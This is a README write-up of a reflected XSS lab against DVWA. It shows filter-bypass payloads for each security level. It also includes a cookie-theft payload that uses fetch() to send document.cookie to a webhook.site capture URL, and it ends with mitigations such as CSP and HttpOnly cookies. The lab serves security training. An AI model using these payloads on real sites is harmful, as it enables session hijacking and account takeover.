# Cross-Site Scripting (XSS) Hands-On Lab

## Overview

This project documents my practical hands-on experience exploiting **Cross-Site Scripting (XSS)** vulnerabilities inside a controlled lab environment using **DVWA (Damn Vulnerable Web Application)**.

The goal of this lab was to understand:

* How XSS vulnerabilities work
* How browsers execute injected JavaScript
* How attackers steal session cookies
* Why weak filtering mechanisms fail
* How developers should properly defend against XSS

> ⚠️ All testing was performed inside intentionally vulnerable applications in an authorized local lab environment.

---

# Lab Environment

| Component        | Purpose                        |
| ---------------- | ------------------------------ |
| Kali Linux       | Attack machine                 |
| DVWA             | Vulnerable target application  |
| webhook.site     | Capturing exfiltrated requests |
| Browser DevTools | Cookie/session inspection      |

---

# What is XSS?

Cross-Site Scripting (XSS) is a web vulnerability that allows attackers to inject malicious JavaScript into pages viewed by other users.

When a victim visits the vulnerable page, the browser executes the attacker’s JavaScript because it trusts the website.

This can lead to:

* Session hijacking
* Credential theft
* Account takeover
* Keylogging
* Phishing
* Malicious redirects

XSS is consistently ranked among the most dangerous vulnerabilities in the OWASP Top 10.

---

# Lab Objectives

* Understand reflected XSS
* Test different DVWA security levels
* Bypass weak input filters
* Steal session cookies
* Observe browser behavior during payload execution
* Learn secure mitigation techniques

---

# Security Levels Tested

## 1. Low Security

### Payload

```html
<script>alert(document.cookie)</script>
```

### Result

The application reflected user input directly into the page without sanitization.

The browser executed the payload successfully and displayed the session cookie.

### Observation

No filtering or output encoding existed.

---

# 2. Medium Security

### Server Defense

The application attempted to filter the word:

```html
<script>
```

### Payload Used

```html
<img src=x onerror=alert(document.cookie)>
```

### Result

The payload bypassed the blacklist filter successfully.

The browser triggered the `onerror` event when the image failed to load, executing the JavaScript.

### Observation

Blacklisting specific tags is not effective protection against XSS.

---

# 3. High Security

### Server Defense

The application used a stronger regex filter targeting script-related patterns.

### Payload Used

```html
<svg onload=alert(1)>
```

### Result

The payload executed successfully despite the stronger filtering mechanism.

### Observation

Attackers can abuse multiple HTML elements capable of executing JavaScript.

---

# Session Cookie Theft Demonstration

## Payload

```html
<svg onload="fetch('https://webhook.site/YOUR-ID?c='+document.cookie)">
```

## Attack Flow

1. Victim loads vulnerable page
2. Browser executes malicious JavaScript
3. Session cookie is appended to request
4. Request is sent silently to attacker-controlled server
5. Attacker captures session token

---

# Impact

If exploited in a real-world application, this vulnerability could allow attackers to:

* Hijack authenticated sessions
* Impersonate users
* Access sensitive information
* Bypass login requirements

This demonstrates why XSS vulnerabilities are considered high-risk.

---

# Mitigation Techniques

## Recommended Defenses

* Output encoding
* Input validation
* Context-aware escaping
* Content Security Policy (CSP)
* HttpOnly cookies
* Secure development practices

---

# Lessons Learned

This lab helped me understand that:

* XSS is far more dangerous than simple alert popups
* Browsers trust application responses heavily
* Weak filtering mechanisms fail easily
* Proper sanitization is critical in web security
* Understanding browser behavior is essential for pentesting

---

# Tools Used

* Kali Linux
* DVWA
* Firefox Developer Tools
* webhook.site
* Burp Suite

---

# Author

## Akabuogu ThankGod

Web Application Pentester | Cybersecurity Content Creator

> “A cybersecurity practitioner building in public.”

---

# Disclaimer

This project was created strictly for educational and ethical security research purposes inside authorized lab environments.

Do NOT test systems without explicit permission.

Added reflected XSS hands-on lab writeup
